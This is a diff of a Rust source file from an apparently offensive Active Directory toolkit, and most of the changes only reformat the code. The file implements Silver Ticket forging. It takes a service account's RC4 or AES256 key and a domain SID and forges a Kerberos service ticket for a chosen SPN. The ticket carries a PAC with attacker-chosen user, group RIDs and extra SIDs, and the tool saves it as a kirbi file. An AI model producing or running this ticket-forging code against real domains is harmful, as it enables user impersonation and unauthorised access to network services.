@@ -1,16 +1,18 @@
-﻿//! Silver Ticket forging — forge a service ticket using a service account's key.
+//! Silver Ticket forging — forge a service ticket using a service account's key.
 //!
 //! Unlike Golden Tickets, Silver Tickets target a specific SPN and never
 //! touch the KDC — they go directly to the target service.
 
-use overthrone_core::error::{OverthroneError, Result};
-use overthrone_core::proto::kerberos::{ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST};
 use chrono::{Duration, Utc};
 use kerberos_asn1::{
-    Asn1Object, EncTicketPart, EncryptedData, KerberosFlags, KerberosTime,
-    PrincipalName, Ticket, TransitedEncoding,
+    Asn1Object, EncTicketPart, EncryptedData, KerberosFlags, KerberosTime, PrincipalName, Ticket,
+    TransitedEncoding,
 };
 use kerberos_crypto::new_kerberos_cipher;
+use overthrone_core::error::{OverthroneError, Result};
+use overthrone_core::proto::kerberos::{
+    ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST,
+};
 use tracing::info;
 
 use crate::golden::{self};
@@ -18,21 +20,20 @@ use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
 use crate::validate;
 
 /// Forge a Silver Ticket (service ticket encrypted with service account key).
-pub async fn forge_silver_ticket(
-    config: &ForgeConfig,
-    target_spn: &str,
-) -> Result<ForgeResult> {
+pub async fn forge_silver_ticket(config: &ForgeConfig, target_spn: &str) -> Result<ForgeResult> {
     info!("[silver] Forging Silver Ticket for SPN: {}", target_spn);
 
-    let service_hash = config.service_hash.as_deref()
-        .ok_or_else(|| OverthroneError::TicketForge(
-            "Service account hash (--service-hash) is required for Silver Ticket".into()
-        ))?;
+    let service_hash = config.service_hash.as_deref().ok_or_else(|| {
+        OverthroneError::TicketForge(
+            "Service account hash (--service-hash) is required for Silver Ticket".into(),
+        )
+    })?;
 
-    let domain_sid = config.domain_sid.as_deref()
-        .ok_or_else(|| OverthroneError::TicketForge(
-            "Domain SID (--domain-sid) is required for Silver Ticket".into()
-        ))?;
+    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
+        OverthroneError::TicketForge(
+            "Domain SID (--domain-sid) is required for Silver Ticket".into(),
+        )
+    })?;
 
     validate::validate_sid_format(domain_sid)?;
 
@@ -42,9 +43,12 @@ pub async fn forge_silver_ticket(
     let etype = match key_bytes.len() {
         16 => ETYPE_RC4_HMAC,
         32 => ETYPE_AES256_CTS,
-        _ => return Err(OverthroneError::TicketForge(
-            format!("Service hash must be 16 (RC4) or 32 (AES256) bytes, got {}", key_bytes.len())
-        )),
+        _ => {
+            return Err(OverthroneError::TicketForge(format!(
+                "Service hash must be 16 (RC4) or 32 (AES256) bytes, got {}",
+                key_bytes.len()
+            )));
+        }
     };
 
     let realm = config.domain.to_uppercase();
@@ -55,9 +59,10 @@ pub async fn forge_silver_ticket(
     // Parse SPN into PrincipalName
     let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
     if spn_parts.len() < 2 {
-        return Err(OverthroneError::TicketForge(
-            format!("Invalid SPN format '{}'. Expected 'service/host'", target_spn)
-        ));
+        return Err(OverthroneError::TicketForge(format!(
+            "Invalid SPN format '{}'. Expected 'service/host'",
+            target_spn
+        )));
     }
 
     let sname = PrincipalName {
@@ -65,15 +70,21 @@ pub async fn forge_silver_ticket(
         name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
     };
 
-    info!("[silver] User={}, SPN={}, Etype={}, Groups={:?}",
+    info!(
+        "[silver] User={}, SPN={}, Etype={}, Groups={:?}",
         impersonate, target_spn, etype, groups
     );
 
     // Build PAC
     let pac_bytes = golden::build_pac(
-        impersonate, &realm, domain_sid,
-        config.user_rid, &groups, &config.extra_sids,
-        &key_bytes, etype,
+        impersonate,
+        &realm,
+        domain_sid,
+        config.user_rid,
+        &groups,
+        &config.extra_sids,
+        &key_bytes,
+        etype,
     )?;
 
     let now = Utc::now();
@@ -126,7 +137,11 @@ pub async fn forge_silver_ticket(
     let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "silver")?;
     let etype_str = golden::etype_name(etype);
 
-    info!("[silver] Silver Ticket forged for {} ({} bytes)", target_spn, ticket_bytes.len());
+    info!(
+        "[silver] Silver Ticket forged for {} ({} bytes)",
+        target_spn,
+        ticket_bytes.len()
+    );
 
     Ok(ForgeResult {
         action: format!("Silver Ticket ({})", target_spn),
@@ -140,7 +155,8 @@ pub async fn forge_silver_ticket(
             encryption_type: etype_str.into(),
             valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
             valid_until: (now + Duration::hours(lifetime as i64))
-                .format("%Y-%m-%d %H:%M:%S UTC").to_string(),
+                .format("%Y-%m-%d %H:%M:%S UTC")
+                .to_string(),
             group_rids: groups,
             extra_sids: config.extra_sids.clone(),
             kirbi_path,
@@ -149,7 +165,8 @@ pub async fn forge_silver_ticket(
             ticket_size_bytes: ticket_bytes.len(),
         }),
         persistence_result: None,
-        message: format!("Silver Ticket forged for SPN {} as {} ({})",
+        message: format!(
+            "Silver Ticket forged for SPN {} as {} ({})",
             target_spn, impersonate, etype_str
         ),
     })
@@ -157,7 +174,5 @@ pub async fn forge_silver_ticket(
 
 fn silver_ticket_flags() -> KerberosFlags {
     let flags: u32 = 0x40A00000; // FORWARDABLE | RENEWABLE | PRE_AUTHENT
-    KerberosFlags {
-        flags,
-    }
+    KerberosFlags { flags }
 }
